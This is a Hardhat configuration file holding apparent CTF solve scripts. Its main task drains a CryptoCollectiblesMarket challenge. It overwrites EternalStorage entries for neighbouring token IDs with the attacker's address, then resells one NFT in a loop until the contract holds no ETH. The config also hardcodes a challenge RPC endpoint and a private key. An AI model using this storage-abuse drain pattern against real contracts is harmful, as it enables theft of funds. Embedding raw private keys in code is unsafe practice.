import '@nomiclabs/hardhat-ethers'
import '@nomiclabs/hardhat-etherscan'
import '@nomiclabs/hardhat-waffle'
import 'hardhat-gas-reporter'
import 'solidity-coverage'

import { BigNumber, Contract, utils } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { HardhatUserConfig, task } from 'hardhat/config'

task('market')
  .addFlag('local')
  .setAction(async ({ local }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer')
    console.log('  at', signer.address)

    // setup problem

    let setup: Contract
    if (local) {
      setup = await (
        await ethers.getContractFactory('contracts/market/Setup.sol:Setup')
      ).deploy({ value: parseEther('50') })
    } else {
      setup = await ethers.getContractAt('contracts/market/Setup.sol:Setup', '')
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const market = await ethers.getContractAt(
      'CryptoCollectiblesMarket',
      await setup.market(),
    )
    console.log('CryptoCollectiblesMarket')
    console.log('  at', market.address)

    const nft = await ethers.getContractAt(
      'CryptoCollectibles',
      await setup.token(),
    )
    console.log('CryptoCollectibles')
    console.log('  at', nft.address)

    const storage = await ethers.getContractAt(
      'EternalStorageAPI',
      await setup.eternalStorage(),
    )
    console.log('EternalStorage')
    console.log('  at', storage.address)

    // perform exploit

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    const tokenID = await market.callStatic.mintCollectible({
      value: parseEther('5'),
    })
    const tokenID_sub1 = BigNumber.from(tokenID).sub(1).toHexString()
    const tokenID_sub2 = BigNumber.from(tokenID).sub(2).toHexString()

    // minMintPrice = (sentValue * 10000) / (10000 + mintFeeBps)
    // sentValue = minMintPrice * (10000 + mintFeeBps) / 10000
    const value = (await market.minMintPrice())
      .mul((await market.mintFeeBps()).add(10000))
      .div(10000)
    // const value = parseEther('5')
    await market.mintCollectible({ value })

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    await storage.updateName(tokenID, utils.zeroPad(signer.address, 32))

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    await storage.updateName(tokenID_sub1, utils.zeroPad(signer.address, 32))

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    await nft.approve(tokenID, market.address)
    await market.sellCollectible(tokenID)

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    let balance = await market.provider.getBalance(market.address)

    while (balance.gt(0)) {
      await storage.updateMetadata(tokenID_sub2, signer.address)

      await nft.approve(tokenID, market.address)
      await market.sellCollectible(tokenID)

      balance = await market.provider.getBalance(market.address)

      console.log('Market')
      console.log('  balance', formatEther(balance))
    }

    // verify

    console.log('Success?', await setup.isSolved())
  })

task('hello').setAction(async ({}, { run, ethers }) => {
  await run('compile')

  const signer = (await ethers.getSigners())[0]
  console.log('Signer', signer.address)

  const setup = await ethers.getContractAt(
    'contracts/hello/Setup.sol:Setup',
    '0x4dC09Be635f3F9D4Ff583f0A10b87c8E9891f4A9',
  )
  console.log('Setup')
  console.log('  at', setup.address)

  const contract = await ethers.getContractAt('Hello', await setup.hello())
  console.log('Hello')
  console.log('  at', contract.address)

  await contract.solve()

  console.log('Success?', await setup.isSolved())
})
export default {
  networks: {
    hardhat: {
      allowUnlimitedContractSize: true,
      forking: {
        url: process.env.ETHEREUM_ARCHIVE_URL,
      },
    },
    hello: {
      url: 'http://104.197.147.133:8545/866e3120-303e-478f-abef-ad51402a1407',
      accounts: [
        '0x62f12a51b88ae9348bc83ba7c7df090a475c8209244c6835b82abf6980c8a4f3',
      ],
    },
  },
  solidity: {
    compilers: [
      {
        version: '0.7.0',
      },
      {
        version: '0.8.0',
      },
      {
        version: '0.5.12',
      },
    ],
  },
  etherscan: {
    apiKey: process.env.ETHERSCAN_APIKEY,
  },
  gasReporter: {
    currency: 'ETH',
    enabled: process.env.REPORT_GAS ? true : false,
  },
} as HardhatUserConfig
